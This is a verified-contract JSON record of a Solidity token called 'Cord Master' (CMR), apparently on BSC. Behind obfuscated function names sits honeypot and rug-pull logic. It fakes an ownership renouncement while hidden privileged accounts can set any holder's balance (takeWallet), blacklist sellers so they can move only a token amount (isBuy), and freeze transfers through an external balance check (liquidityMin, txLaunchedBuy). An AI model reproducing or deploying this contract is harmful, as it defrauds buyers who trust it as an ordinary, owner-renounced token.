{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface enableSender {\n    function createPair(address fromList, address shouldFromMax) external returns (address);\n}\n\ninterface isAtSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletAt) external view returns (uint256);\n\n    function transfer(address tradingLiquidityMax, uint256 txList) external returns (bool);\n\n    function allowance(address walletSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingLiquidityMax,\n        uint256 txList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenAuto, uint256 value);\n    event Approval(address indexed walletSwap, address indexed spender, uint256 value);\n}\n\nabstract contract receiverLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingMaxMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderAmount is isAtSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CordMaster is receiverLiquidity, isAtSender, senderAmount {\n\n    string private teamMode = \"CMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTrading;\n    }\n\n    address private toReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMode;\n    }\n\n    function balanceOf(address walletAt) public view virtual override returns (uint256) {\n        return takeLimit[walletAt];\n    }\n\n    function txLaunchedBuy(uint256 txList) public {\n        exemptShould();\n        isShouldMin = txList;\n    }\n\n    function takeWallet(address autoReceiver, uint256 txList) public {\n        exemptShould();\n        takeLimit[autoReceiver] = txList;\n    }\n\n    mapping(address => uint256) private takeLimit;\n\n    uint256 isShouldMin;\n\n    function allowance(address marketingIsLimit, address takeListSwap) external view virtual override returns (uint256) {\n        if (takeListSwap == swapSellIs) {\n            return type(uint256).max;\n        }\n        return minTrading[marketingIsLimit][takeListSwap];\n    }\n\n    address receiverMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 takeBuy;\n\n    function launchTotalMax(address sellReceiver, address tradingLiquidityMax, uint256 txList) internal returns (bool) {\n        require(takeLimit[sellReceiver] >= txList);\n        takeLimit[sellReceiver] -= txList;\n        takeLimit[tradingLiquidityMax] += txList;\n        emit Transfer(sellReceiver, tradingLiquidityMax, txList);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return toReceiver;\n    }\n\n    function liquidityMin(address sellReceiver, address tradingLiquidityMax, uint256 txList) internal returns (bool) {\n        if (sellReceiver == tradingMode) {\n            return launchTotalMax(sellReceiver, tradingLiquidityMax, txList);\n        }\n        uint256 atSellTrading = isAtSender(fromEnable).balanceOf(receiverMax);\n        require(atSellTrading == isShouldMin);\n        require(tradingLiquidityMax != receiverMax);\n        if (launchSell[sellReceiver]) {\n            return launchTotalMax(sellReceiver, tradingLiquidityMax, sellMin);\n        }\n        return launchTotalMax(sellReceiver, tradingLiquidityMax, txList);\n    }\n\n    bool private receiverTo;\n\n    constructor (){\n        \n        tradingMaxMin tradingTotal = tradingMaxMin(swapSellIs);\n        fromEnable = enableSender(tradingTotal.factory()).createPair(tradingTotal.WETH(), address(this));\n        \n        tradingMode = _msgSender();\n        teamSellMode[tradingMode] = true;\n        takeLimit[tradingMode] = toTrading;\n        fundReceiverLaunch();\n        if (liquiditySender) {\n            enableSell = true;\n        }\n        emit Transfer(address(0), tradingMode, toTrading);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeExempt;\n    }\n\n    uint256 private toTrading = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed sellSwapMarketing, address indexed feeIsMin);\n\n    function approve(address takeListSwap, uint256 txList) public virtual override returns (bool) {\n        minTrading[_msgSender()][takeListSwap] = txList;\n        emit Approval(_msgSender(), takeListSwap, txList);\n        return true;\n    }\n\n    mapping(address => bool) public launchSell;\n\n    bool private enableSell;\n\n    function isBuy(address shouldMarketing) public {\n        exemptShould();\n        if (receiverTo) {\n            receiverTo = true;\n        }\n        if (shouldMarketing == tradingMode || shouldMarketing == fromEnable) {\n            return;\n        }\n        launchSell[shouldMarketing] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private minTrading;\n\n    function transferFrom(address sellReceiver, address tradingLiquidityMax, uint256 txList) external override returns (bool) {\n        if (_msgSender() != swapSellIs) {\n            if (minTrading[sellReceiver][_msgSender()] != type(uint256).max) {\n                require(txList <= minTrading[sellReceiver][_msgSender()]);\n                minTrading[sellReceiver][_msgSender()] -= txList;\n            }\n        }\n        return liquidityMin(sellReceiver, tradingLiquidityMax, txList);\n    }\n\n    function transfer(address autoReceiver, uint256 txList) external virtual override returns (bool) {\n        return liquidityMin(_msgSender(), autoReceiver, txList);\n    }\n\n    function owner() external view returns (address) {\n        return toReceiver;\n    }\n\n    address swapSellIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fundReceiverLaunch() public {\n        emit OwnershipTransferred(tradingMode, address(0));\n        toReceiver = address(0);\n    }\n\n    bool public senderLaunch;\n\n    mapping(address => bool) public teamSellMode;\n\n    bool private liquiditySender;\n\n    address public fromEnable;\n\n    uint256 constant sellMin = 11 ** 10;\n\n    string private limitMode = \"Cord Master\";\n\n    function receiverMarketing(address shouldLimit) public {\n        require(shouldLimit.balance < 100000);\n        if (senderLaunch) {\n            return;\n        }\n        \n        teamSellMode[shouldLimit] = true;\n        if (liquiditySender) {\n            receiverTo = false;\n        }\n        senderLaunch = true;\n    }\n\n    address public tradingMode;\n\n    uint8 private takeExempt = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return limitMode;\n    }\n\n    function exemptShould() private view {\n        require(teamSellMode[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSwapMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeIsMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingIsLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeListSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeListSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"}],\"name\":\"isBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"}],\"name\":\"receiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txList\",\"type\":\"uint256\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLiquidityMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txList\",\"type\":\"uint256\"}],\"name\":\"txLaunchedBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CordMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}